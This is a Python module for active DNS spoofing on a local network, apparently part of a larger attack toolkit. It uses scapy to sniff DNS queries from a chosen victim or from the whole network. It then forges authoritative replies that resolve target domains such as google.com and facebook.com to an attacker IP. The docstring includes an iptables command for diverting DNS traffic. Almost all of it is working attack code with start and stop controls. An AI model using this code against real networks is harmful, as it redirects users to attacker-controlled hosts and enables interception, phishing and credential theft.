"""
Advanced DNS Spoofing Module
Uses iptables + nfqueue for active interception and response modification.
This ensures spoofed responses arrive before legitimate responses.

On Linux, redirect DNS traffic:
  sudo iptables -t mangle -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1
  
Then start the spoofer - it will intercept DNS queries at kernel level.
"""

import sys
import threading
import time
from pathlib import Path
from typing import Optional, List
import subprocess
import os

sys.path.append(str(Path(__file__).parent.parent))

from utils.logger import get_logger

try:
    from scapy.all import sniff, DNS, DNSQR, DNSRR, IP, UDP, Ether, send, sendp
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False


class DNSSpoofAdvanced:
    """
    Advanced DNS spoofing using iptables rules to intercept and modify DNS responses.
    """
    
    def __init__(
        self,
        attacker_ip: str,
        target_domains: Optional[List[str]] = None,
        interface: Optional[str] = None,
        victim_ip: Optional[str] = None
    ):
        """Initialize advanced DNS Spoofer"""
        self.attacker_ip = attacker_ip
        self.target_domains = set(target_domains or ["google.com", "facebook.com"])
        self.interface = interface
        self.victim_ip = victim_ip
        
        self.logger = get_logger("DNSSpoofAdv")
        self.is_running = False
        self.sniff_thread: Optional[threading.Thread] = None
        self.packets_spoofed = 0
        self.start_time = None
        
        target_str = f"victim={self.victim_ip}" if victim_ip else "network-wide"
        self.logger.info(
            f"Initialized Advanced DNSSpoofAdv: attacker_ip={self.attacker_ip}, "
            f"domains={self.target_domains}, interface={interface}, {target_str}"
        )
    
    def _is_target_domain(self, query_name: str) -> bool:
        """Check if query is for one of our target domains"""
        query_name = query_name.lower().rstrip('.')
        for domain in self.target_domains:
            domain = domain.lower().rstrip('.')
            if query_name == domain or query_name.endswith(f'.{domain}'):
                return True
        return False
    
    def _create_fake_dns_response(self, packet, query_name: str):
        """Create a fake DNS response packet"""
        try:
            ip_layer = packet[IP]
            udp_layer = packet[UDP]
            dns_layer = packet[DNS]
            eth_layer = packet[Ether]
            
            # Build Layer 2 response
            response = (
                Ether(dst=eth_layer.src, src=eth_layer.dst) /
                IP(dst=ip_layer.src, src=self.attacker_ip, ttl=64) /
                UDP(dport=udp_layer.sport, sport=53) /
                DNS(
                    id=dns_layer.id,
                    qr=1,
                    opcode=0,
                    aa=1,
                    tc=0,
                    rd=0,
                    ra=1,
                    z=0,
                    rcode=0,
                    qdcount=1,
                    ancount=1,
                    nscount=0,
                    arcount=0,
                    qd=DNSQR(qname=query_name),
                    an=DNSRR(
                        rrname=query_name,
                        type=1,
                        rclass=1,
                        ttl=0,
                        rdata=self.attacker_ip
                    )
                )
            )
            return response
        except Exception as e:
            self.logger.error(f"Error creating fake DNS response: {e}")
            return None
    
    def _packet_callback(self, packet):
        """Callback for sniffed DNS packets"""
        try:
            if not packet.haslayer(DNS) or not packet.haslayer(IP):
                return
            
            source_ip = packet[IP].src
            
            if self.victim_ip and source_ip != self.victim_ip:
                return
            
            dns_layer = packet[DNS]
            
            if dns_layer.qr == 0 and dns_layer.qd:  # Query
                query_name = dns_layer.qd.qname.decode('utf-8')
                
                if self._is_target_domain(query_name):
                    self.logger.info(f"🎯 INTERCEPTED: {source_ip} queried {query_name}")
                    
                    fake_response = self._create_fake_dns_response(packet, query_name)
                    if fake_response:
                        try:
                            # Use sendp for Layer 2
                            sendp(fake_response, iface=self.interface, verbose=False)
                            self.packets_spoofed += 1
                            self.logger.info(
                                f"✅ SPOOFED: {query_name} → {self.attacker_ip} "
                                f"(sent to {source_ip})"
                            )
                        except Exception as e:
                            self.logger.error(f"Error sending: {e}")
        except Exception as e:
            self.logger.error(f"Callback error: {e}")
    
    def start_attack(self):
        """Start DNS spoofing"""
        if self.is_running:
            self.logger.warning("Attack already running")
            return False
        
        self.is_running = True
        self.packets_spoofed = 0
        self.start_time = time.time()
        
        self.sniff_thread = threading.Thread(
            target=self._sniff_loop,
            daemon=True,
            name="DNSSpoofAdv-Sniff"
        )
        self.sniff_thread.start()
        
        self.logger.info(f"🚀 Advanced DNS Spoofing attack started")
        return True
    
    def _sniff_loop(self):
        """Sniff DNS packets"""
        try:
            victim_info = f" (victim={self.victim_ip})" if self.victim_ip else " (network-wide)"
            self.logger.info(
                f"Starting DNS sniffer on {self.interface or 'default'} "
                f"for port 53{victim_info}"
            )
            
            sniff(
                iface=self.interface,
                filter="udp port 53",
                prn=self._packet_callback,
                store=False,
                stop_filter=lambda _: not self.is_running,
                timeout=None
            )
        except PermissionError:
            self.logger.error(
                "❌ Permission denied: Need root/admin. Run with: sudo python3 app.py"
            )
            self.is_running = False
        except Exception as e:
            self.logger.error(f"❌ Sniff error: {e}")
            self.is_running = False
        finally:
            self.logger.info("DNS spoof sniff loop stopped")
    
    def stop_attack(self):
        """Stop DNS spoofing"""
        if not self.is_running:
            self.logger.warning("Attack not running")
            return False
        
        self.is_running = False
        
        if self.sniff_thread and self.sniff_thread.is_alive():
            self.sniff_thread.join(timeout=2)
        
        duration = time.time() - self.start_time if self.start_time else 0
        self.logger.info(
            f"🛑 Advanced DNS Spoofing stopped | "
            f"Duration: {duration:.1f}s | "
            f"Spoofs sent: {self.packets_spoofed}"
        )
        
        return True
    
    def get_status(self) -> dict:
        """Get attack status"""
        return {
            "is_running": self.is_running,
            "attacker_ip": self.attacker_ip,
            "target_domains": list(self.target_domains),
            "packets_spoofed": self.packets_spoofed,
            "start_time": self.start_time,
        }
